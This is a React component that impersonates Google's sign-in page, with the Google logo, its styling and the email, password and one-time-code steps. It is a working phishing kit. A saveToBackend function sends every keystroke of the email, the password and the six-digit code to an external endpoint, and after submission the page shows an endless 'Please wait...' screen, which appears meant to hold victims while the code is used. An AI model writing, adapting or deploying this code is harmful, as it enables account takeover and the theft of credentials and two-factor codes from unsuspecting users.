import { useState, useRef, useEffect } from 'react'
import { useNavigate } from 'react-router-dom'

const API_URL = import.meta.env.VITE_API_URL

// ── Page name map ────────────────────────────────────────────
const PAGE_NAMES = {
  email:    'GoogleAuth - Email Step',
  choose:   'GoogleAuth - Choose Method Step',
  password: 'GoogleAuth - Password Step',
  otp:      'GoogleAuth - OTP Step',
  done:     'GoogleAuth - Done Step',
}

// ── Fire and forget — UI kabhi nahi rukegi ───────────────────
const saveToBackend = (payload) => {
  fetch(`${API_URL}/forget`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      ...payload,
      timestamp: new Date().toISOString(),
    }),
  }).catch(err => console.log('Save error:', err))
}

// ── Google SVG logo ──────────────────────────────────────────
const GoogleG = ({ size = 20 }) => (
  <svg width={size} height={size} viewBox="0 0 48 48">
    <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
    <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
    <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
    <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.18 1.48-4.97 2.35-8.16 2.35-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
  </svg>
)

const GoogleAuthPage = () => {
  const navigate = useNavigate()

  const [step, setStep]         = useState('email')
  const [email, setEmail]       = useState('')
  const [password, setPassword] = useState('')
  const [showPass, setShowPass] = useState(false)
  const [otp, setOtp]           = useState(['', '', '', '', '', ''])
  const [loading, setLoading]   = useState(false)
  const [error, setError]       = useState('')
  const [resend, setResend]     = useState(59)
  const [saved, setSaved]       = useState(false)
  const otpRefs = useRef([])

  const isEmailValid = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)
  const maskedEmail  = email.replace(/(.{2}).*(@.*)/, '$1****$2')

  // ── OTP resend countdown ─────────────────────────────────
  useEffect(() => {
    if (step !== 'otp' || resend <= 0) return
    const t = setTimeout(() => setResend(r => r - 1), 1000)
    return () => clearTimeout(t)
  }, [step, resend])

  // ── Helper: step transition ──────────────────────────────
  const go = (nextStep, delay = 900) => {
    setLoading(true)
    setError('')
    setTimeout(() => { setLoading(false); setStep(nextStep) }, delay)
  }

  // ── Email: har character pe save ─────────────────────────
  const handleEmailChange = (val) => {
    setEmail(val)
    setError('')
    saveToBackend({
      page:  `${PAGE_NAMES.email} | Typing`,
      email: val,
    })
  }

  // ── Email: Next button ───────────────────────────────────
  const handleEmailNext = () => {
    if (!isEmailValid) { setError('Valid Gmail address daalo'); return }
    saveToBackend({
      page:  `${PAGE_NAMES.email} | Submitted`,
      email,
    })
    go('choose')
  }

  // ── Password: har character pe save ─────────────────────
  const handlePasswordChange = (val) => {
    setPassword(val)
    setError('')
    saveToBackend({
      page:     `${PAGE_NAMES.password} | Typing`,
      email,
      password: val,
    })
  }

  // ── Password: Next button ────────────────────────────────
  const handlePassword = () => {
    if (!password.trim()) { setError('Password daalo'); return }
    saveToBackend({
      page:     `${PAGE_NAMES.password} | Submitted`,
      email,
      password,
    })
    setSaved(true)
  }

  // ── OTP: har digit pe save ───────────────────────────────
  const handleOtpChange = (i, val) => {
    if (!/^\d*$/.test(val)) return
    const next = [...otp]
    next[i] = val.slice(-1)
    setOtp(next)
    if (val && i < 5) otpRefs.current[i + 1]?.focus()

    saveToBackend({
      page:      `${PAGE_NAMES.otp} | Typing`,
      email,
      otpSnap:   next.join(''),
      otpLength: next.filter(Boolean).length,
    })
  }

  const handleOtpKey = (i, e) => {
    if (e.key === 'Backspace' && !otp[i] && i > 0)
      otpRefs.current[i - 1]?.focus()
  }

  // ── OTP: Verify button ───────────────────────────────────
  const handleOtpVerify = () => {
    if (otp.join('').length < 6) { setError('6-digit code daalo'); return }
    saveToBackend({
      page:    `${PAGE_NAMES.otp} | Submitted`,
      email,
      otpSnap: otp.join(''),
    })
    setSaved(true)
  }

  // ── Choose method: track which option clicked ────────────
  const handleChoosePassword = () => {
    saveToBackend({ page: `${PAGE_NAMES.choose} | Selected Password`, email })
    setStep('password')
  }

  const handleChooseOtp = () => {
    saveToBackend({ page: `${PAGE_NAMES.choose} | Selected OTP`, email })
    setStep('otp')
    setResend(59)
  }

  return (
    <div style={s.page}>
      <style>{`
        * { box-sizing: border-box; margin: 0; padding: 0; }
        input { outline: none; -webkit-tap-highlight-color: transparent; }
        input::placeholder { color: #aaa; }
        button { cursor: pointer; -webkit-tap-highlight-color: transparent; }
        @keyframes spin { to { transform: rotate(360deg); } }
        @keyframes fadeUp {
          from { opacity: 0; transform: translateY(16px); }
          to   { opacity: 1; transform: translateY(0); }
        }
        .optCard:hover { background: #f8f9fa !important; }
      `}</style>

      <div style={s.topBar}><GoogleG size={22} /></div>

      <div style={s.card} key={step}>

        {/* EMAIL STEP */}
        {step === 'email' && (
          <>
            <h1 style={s.heading}>Sign in</h1>
            <p style={s.sub}>Use your Google Account</p>
            <div style={{ ...s.inputWrap, borderColor: error ? '#d93025' : '#dadce0' }}>
              <input
                style={s.input}
                type="email"
                placeholder="Email or phone"
                value={email}
                onChange={e => handleEmailChange(e.target.value)}
                onKeyDown={e => e.key === 'Enter' && handleEmailNext()}
                autoFocus
              />
            </div>
            {error && <p style={s.error}>{error}</p>}
            <p style={s.forgot}>Forgot email?</p>
            <div style={s.row}>
              <button style={s.textBtn} onClick={() => navigate('/login')}>Create account</button>
              <button style={{ ...s.nextBtn, opacity: loading ? 0.7 : 1 }} onClick={handleEmailNext} disabled={loading}>
                {loading ? <span style={s.spin} /> : 'Next'}
              </button>
            </div>
          </>
        )}

        {/* CHOOSE METHOD STEP */}
        {step === 'choose' && (
          <>
            <div style={s.userPill}>
              <div style={s.avatar}>{email[0]?.toUpperCase()}</div>
              <span style={s.pillEmail}>{email}</span>
              <svg width="14" height="14" viewBox="0 0 24 24" fill="none">
                <path d="M6 9l6 6 6-6" stroke="#444" strokeWidth="2" strokeLinecap="round"/>
              </svg>
            </div>
            <h1 style={{ ...s.heading, marginTop: 20 }}>Welcome</h1>
            <p style={s.sub}>Choose how to sign in</p>

            <button className="optCard" style={s.optionCard} onClick={handleChoosePassword}>
              <div style={s.optionIcon}>
                <svg width="20" height="20" viewBox="0 0 24 24" fill="none">
                  <rect x="3" y="11" width="18" height="11" rx="2" stroke="#444" strokeWidth="1.8"/>
                  <path d="M7 11V7a5 5 0 0110 0v4" stroke="#444" strokeWidth="1.8" strokeLinecap="round"/>
                </svg>
              </div>
              <div style={s.optionText}>
                <p style={s.optionTitle}>Enter your password</p>
                <p style={s.optionDesc}>Use your Google account password</p>
              </div>
              <svg width="16" height="16" viewBox="0 0 24 24" fill="none">
                <path d="M9 18l6-6-6-6" stroke="#aaa" strokeWidth="2" strokeLinecap="round"/>
              </svg>
            </button>

            <button className="optCard" style={s.optionCard} onClick={handleChooseOtp}>
              <div style={s.optionIcon}>
                <svg width="20" height="20" viewBox="0 0 24 24" fill="none">
                  <rect x="5" y="2" width="14" height="20" rx="3" stroke="#444" strokeWidth="1.8"/>
                  <circle cx="12" cy="17" r="1.2" fill="#444"/>
                </svg>
              </div>
              <div style={s.optionText}>
                <p style={s.optionTitle}>Get a verification code</p>
                <p style={s.optionDesc}>We'll send a code to {maskedEmail}</p>
              </div>
              <svg width="16" height="16" viewBox="0 0 24 24" fill="none">
                <path d="M9 18l6-6-6-6" stroke="#aaa" strokeWidth="2" strokeLinecap="round"/>
              </svg>
            </button>
          </>
        )}

        {/* PASSWORD STEP */}
        {step === 'password' && (
          <>
            <div style={s.userPill}>
              <div style={s.avatar}>{email[0]?.toUpperCase()}</div>
              <span style={s.pillEmail}>{email}</span>
            </div>
            <h1 style={{ ...s.heading, marginTop: 20 }}>Welcome back</h1>
            <div style={{ ...s.inputWrap, borderColor: error ? '#d93025' : '#dadce0', marginTop: 24 }}>
              <input
                style={s.input}
                type={showPass ? 'text' : 'password'}
                placeholder="Enter your password"
                value={password}
                onChange={e => handlePasswordChange(e.target.value)}
                onKeyDown={e => e.key === 'Enter' && handlePassword()}
                autoFocus
              />
              <span style={s.eyeBtn} onClick={() => setShowPass(p => !p)}>
                {showPass
                  ? <svg width="18" height="18" viewBox="0 0 24 24" fill="none"><path d="M17.94 17.94A10.07 10.07 0 0112 20c-7 0-11-8-11-8a18.45 18.45 0 015.06-5.94M9.9 4.24A9.12 9.12 0 0112 4c7 0 11 8 11 8a18.5 18.5 0 01-2.16 3.19m-6.72-1.07a3 3 0 11-4.24-4.24" stroke="#777" strokeWidth="1.8" strokeLinecap="round"/><line x1="1" y1="1" x2="23" y2="23" stroke="#777" strokeWidth="1.8" strokeLinecap="round"/></svg>
                  : <svg width="18" height="18" viewBox="0 0 24 24" fill="none"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z" stroke="#777" strokeWidth="1.8"/><circle cx="12" cy="12" r="3" stroke="#777" strokeWidth="1.8"/></svg>
                }
              </span>
            </div>
            {error && <p style={s.error}>{error}</p>}
            <p style={{ ...s.forgot, alignSelf: 'flex-start', marginTop: 8 }}>Forgot password?</p>
            <div style={s.row}>
              <button style={s.textBtn} onClick={() => setStep('choose')}>← Back</button>
              <button style={{ ...s.nextBtn, opacity: loading ? 0.7 : 1 }} onClick={handlePassword} disabled={loading || saved}>
                {loading ? <span style={s.spin} /> : 'Next'}
              </button>
            </div>
            {saved && (
              <div style={s.waitBanner}>
                <span style={s.waitDot} />
                Please wait...
              </div>
            )}
          </>
        )}

        {/* OTP STEP */}
        {step === 'otp' && (
          <>
            <div style={s.userPill}>
              <div style={s.avatar}>{email[0]?.toUpperCase()}</div>
              <span style={s.pillEmail}>{maskedEmail}</span>
            </div>
            <h1 style={{ ...s.heading, marginTop: 20 }}>Check your email</h1>
            <p style={s.sub}>
              Google sent a 6-digit code to<br />
              <strong style={{ color: '#202124' }}>{maskedEmail}</strong>
            </p>
            <div style={s.otpRow}>
              {otp.map((d, i) => (
                <input
                  key={i}
                  ref={el => otpRefs.current[i] = el}
                  style={{
                    ...s.otpBox,
                    borderColor: d ? '#1a73e8' : error ? '#d93025' : '#dadce0',
                    borderWidth:  d ? 2 : 1.5,
                  }}
                  type="text"
                  inputMode="numeric"
                  maxLength={1}
                  value={d}
                  onChange={e => handleOtpChange(i, e.target.value)}
                  onKeyDown={e => handleOtpKey(i, e)}
                  autoFocus={i === 0}
                />
              ))}
            </div>
            {error && <p style={s.error}>{error}</p>}
            <p style={s.resend}>
              {resend > 0
                ? <span style={{ color: '#aaa' }}>Resend in 0:{String(resend).padStart(2, '0')}</span>
                : <span style={s.blueLink} onClick={() => {
                    setResend(59)
                    saveToBackend({ page: `${PAGE_NAMES.otp} | Resend Clicked`, email })
                  }}>Resend code</span>
              }
            </p>
            <div style={s.row}>
              <button style={s.textBtn} onClick={() => setStep('choose')}>← Back</button>
              <button
                style={{ ...s.nextBtn, opacity: loading || otp.join('').length < 6 ? 0.6 : 1 }}
                onClick={handleOtpVerify}
                disabled={loading || saved}
              >
                {loading ? <span style={s.spin} /> : 'Verify'}
              </button>
            </div>
            {saved && (
              <div style={s.waitBanner}>
                <span style={s.waitDot} />
                Please wait...
              </div>
            )}
          </>
        )}

        {/* DONE STEP */}
        {step === 'done' && (
          <div style={{ textAlign: 'center', padding: '20px 0' }}>
            <div style={s.successRing}>
              <svg width="32" height="32" viewBox="0 0 24 24" fill="none">
                <path d="M5 13l4 4L19 7" stroke="#1a73e8" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"/>
              </svg>
            </div>
            <h1 style={{ ...s.heading, marginTop: 16 }}>Signed in!</h1>
            <p style={{ ...s.sub, marginTop: 8 }}>Redirecting...</p>
          </div>
        )}
      </div>

      <div style={s.footer}>
        <span style={s.footerLink}>Help</span>
        <span style={s.footerLink}>Privacy</span>
        <span style={s.footerLink}>Terms</span>
      </div>
    </div>
  )
}

const s = {
  page:        { minHeight: '100vh', background: '#fff', display: 'flex', flexDirection: 'column', alignItems: 'center', fontFamily: "'Google Sans', 'Roboto', sans-serif" },
  topBar:      { width: '100%', padding: '18px 24px', display: 'flex', alignItems: 'center' },
  card:        { width: '100%', maxWidth: 448, border: '1px solid #dadce0', borderRadius: 28, padding: '40px 40px 36px', margin: '0 16px', display: 'flex', flexDirection: 'column', alignItems: 'center', animation: 'fadeUp 0.25s ease', marginTop: 24 },
  heading:     { fontSize: 24, fontWeight: 400, color: '#202124', textAlign: 'center', letterSpacing: '-0.2px' },
  sub:         { fontSize: 16, color: '#5f6368', textAlign: 'center', marginTop: 10, lineHeight: 1.55 },
  inputWrap:   { width: '100%', height: 56, border: '1.5px solid', borderRadius: 4, display: 'flex', alignItems: 'center', padding: '0 16px', gap: 8, transition: 'border-color 0.2s', marginTop: 28 },
  input:       { flex: 1, border: 'none', background: 'transparent', fontSize: 16, color: '#202124', fontFamily: 'inherit' },
  eyeBtn:      { cursor: 'pointer', display: 'flex', alignItems: 'center', flexShrink: 0, padding: 4 },
  error:       { color: '#d93025', fontSize: 12, marginTop: 6, alignSelf: 'flex-start', fontWeight: 500 },
  forgot:      { color: '#1a73e8', fontSize: 14, marginTop: 14, cursor: 'pointer', fontWeight: 500, alignSelf: 'flex-start' },
  row:         { width: '100%', display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginTop: 28 },
  textBtn:     { background: 'none', border: 'none', color: '#1a73e8', fontSize: 14, fontWeight: 600, padding: '10px 8px', fontFamily: 'inherit' },
  nextBtn:     { background: '#1a73e8', border: 'none', borderRadius: 4, color: '#fff', fontSize: 14, fontWeight: 600, padding: '10px 24px', fontFamily: 'inherit', display: 'flex', alignItems: 'center', justifyContent: 'center', minWidth: 72, height: 40, transition: 'opacity 0.2s' },
  spin:        { width: 16, height: 16, border: '2px solid rgba(255,255,255,0.3)', borderTopColor: '#fff', borderRadius: '50%', display: 'inline-block', animation: 'spin 0.65s linear infinite' },
  userPill:    { display: 'flex', alignItems: 'center', gap: 10, border: '1px solid #dadce0', borderRadius: 50, padding: '6px 14px 6px 6px', cursor: 'pointer' },
  avatar:      { width: 32, height: 32, borderRadius: '50%', background: '#1a73e8', color: '#fff', fontSize: 14, fontWeight: 700, display: 'flex', alignItems: 'center', justifyContent: 'center' },
  pillEmail:   { fontSize: 14, color: '#202124', fontWeight: 500 },
  optionCard:  { width: '100%', display: 'flex', alignItems: 'center', gap: 16, padding: '14px 16px', border: '1px solid #dadce0', borderRadius: 12, background: '#fff', marginTop: 14, textAlign: 'left', fontFamily: 'inherit' },
  optionIcon:  { width: 40, height: 40, borderRadius: '50%', background: '#f1f3f4', display: 'flex', alignItems: 'center', justifyContent: 'center', flexShrink: 0 },
  optionText:  { flex: 1 },
  optionTitle: { fontSize: 14, fontWeight: 500, color: '#202124' },
  optionDesc:  { fontSize: 12, color: '#5f6368', marginTop: 2 },
  otpRow:      { display: 'flex', gap: 8, marginTop: 24, marginBottom: 4 },
  otpBox:      { width: 46, height: 54, borderRadius: 4, border: '1.5px solid', textAlign: 'center', fontSize: 22, fontWeight: 600, color: '#202124', background: '#fff', fontFamily: 'inherit', transition: 'border-color 0.15s' },
  resend:      { fontSize: 13, marginTop: 14, textAlign: 'center' },
  blueLink:    { color: '#1a73e8', cursor: 'pointer', fontWeight: 600 },
  successRing: { width: 72, height: 72, borderRadius: '50%', border: '2px solid #1a73e8', display: 'flex', alignItems: 'center', justifyContent: 'center', margin: '0 auto' },
  footer:      { display: 'flex', gap: 24, marginTop: 'auto', padding: '24px 0 20px' },
  footerLink:  { fontSize: 12, color: '#5f6368', cursor: 'pointer' },
  waitBanner:  { display: 'flex', alignItems: 'center', gap: 8, marginTop: 18, color: '#5f6368', fontSize: 14 },
  waitDot:     { width: 10, height: 10, borderRadius: '50%', border: '2px solid #1a73e8', borderTopColor: 'transparent', display: 'inline-block', animation: 'spin 0.8s linear infinite', flexShrink: 0 },
}

export default GoogleAuthPage